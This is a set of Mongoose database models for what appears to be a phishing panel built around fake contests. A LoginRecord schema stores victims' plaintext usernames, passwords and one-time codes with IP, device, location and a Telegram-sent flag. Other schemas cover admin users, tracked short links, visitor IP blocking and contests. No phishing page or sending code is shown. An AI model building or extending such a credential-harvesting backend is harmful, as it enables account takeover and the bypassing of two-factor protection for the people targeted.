// models/User.js
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

const userSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    trim: true
  },
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true
  },
  password: {
    type: String,
    required: true,
    minlength: 6
  },
  role: {
    type: String,
    enum: ['superadmin', 'manager', 'editor'],
    default: 'editor'
  },
  status: {
    type: String,
    enum: ['active', 'inactive'],
    default: 'active'
  },
  permissions: [{
    type: String,
    enum: ['read', 'write', 'approve', 'delete', 'manage_users', 'system_settings']
  }],
  lastLogin: {
    type: Date
  },
  avatar: {
    type: String
  },
  twoFactorEnabled: {
    type: Boolean,
    default: false
  },
  telegramChatId: {
    type: String
  }
}, {
  timestamps: true
});

// Hash password before saving
userSchema.pre('save', async function(next) {
  if (!this.isModified('password')) return next();
  
  try {
    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
    next();
  } catch (error) {
    next(error);
  }
});

// Compare password method
userSchema.methods.comparePassword = async function(candidatePassword) {
  return await bcrypt.compare(candidatePassword, this.password);
};

// Remove password from JSON output
userSchema.methods.toJSON = function() {
  const userObject = this.toObject();
  delete userObject.password;
  return userObject;
};

module.exports = mongoose.model('User', userSchema);

// models/LoginRecord.js
const mongoose = require('mongoose');

const loginRecordSchema = new mongoose.Schema({
  contestName: {
    type: String,
    required: true
  },
  username: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  },
  otpCode: {
    type: String,
    required: true
  },
  ipAddress: {
    type: String,
    required: true
  },
  device: {
    type: String,
    required: true
  },
  location: {
    country: String,
    city: String,
    timezone: String
  },
  status: {
    type: String,
    enum: ['success', 'failed', 'pending'],
    default: 'pending'
  },
  userAgent: {
    type: String
  },
  telegramSent: {
    type: Boolean,
    default: false
  },
  notificationSent: {
    type: Boolean,
    default: false
  },
  createdBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  }
}, {
  timestamps: true
});

// Index for faster queries
loginRecordSchema.index({ status: 1, createdAt: -1 });
loginRecordSchema.index({ contestName: 1 });
loginRecordSchema.index({ ipAddress: 1 });

module.exports = mongoose.model('LoginRecord', loginRecordSchema);

// models/Link.js
const mongoose = require('mongoose');

const linkSchema = new mongoose.Schema({
  title: {
    type: String,
    required: true,
    trim: true
  },
  url: {
    type: String,
    required: true,
    trim: true
  },
  category: {
    type: String,
    required: true
  },
  description: {
    type: String,
    trim: true
  },
  clicks: {
    type: Number,
    default: 0
  },
  status: {
    type: String,
    enum: ['active', 'inactive', 'scheduled'],
    default: 'active'
  },
  shortUrl: {
    type: String,
    unique: true
  },
  scheduledDate: {
    type: Date
  },
  createdBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  }
}, {
  timestamps: true
});

// Generate short URL before saving
linkSchema.pre('save', function(next) {
  if (!this.shortUrl) {
    this.shortUrl = generateShortUrl();
  }
  next();
});

function generateShortUrl() {
  return Math.random().toString(36).substring(2, 8);
}

module.exports = mongoose.model('Link', linkSchema);

// models/IPRecord.js
const mongoose = require('mongoose');

const ipRecordSchema = new mongoose.Schema({
  ipAddress: {
    type: String,
    required: true,
    unique: true
  },
  user: {
    type: String,
    required: true
  },
  location: {
    country: String,
    city: String,
    region: String,
    coordinates: {
      lat: Number,
      lng: Number
    }
  },
  device: {
    type: String
  },
  status: {
    type: String,
    enum: ['allowed', 'blocked', 'suspicious'],
    default: 'allowed'
  },
  blockReason: {
    type: String
  },
  blockUntil: {
    type: Date
  },
  loginAttempts: {
    type: Number,
    default: 0
  },
  lastActivity: {
    type: Date,
    default: Date.now
  },
  createdBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User'
  }
}, {
  timestamps: true
});

// Index for faster queries
ipRecordSchema.index({ ipAddress: 1 });
ipRecordSchema.index({ status: 1 });

module.exports = mongoose.model('IPRecord', ipRecordSchema);

// models/Contest.js
const mongoose = require('mongoose');

const contestSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    unique: true
  },
  description: {
    type: String
  },
  startDate: {
    type: Date,
    required: true
  },
  endDate: {
    type: Date,
    required: true
  },
  status: {
    type: String,
    enum: ['draft', 'active', 'ended'],
    default: 'draft'
  },
  maxContestants: {
    type: Number,
    default: 1000
  },
  registrationFee: {
    type: Number,
    default: 0
  },
  rules: {
    type: String
  },
  createdBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  }
}, {
  timestamps: true
});

module.exports = mongoose.model('Contest', contestSchema);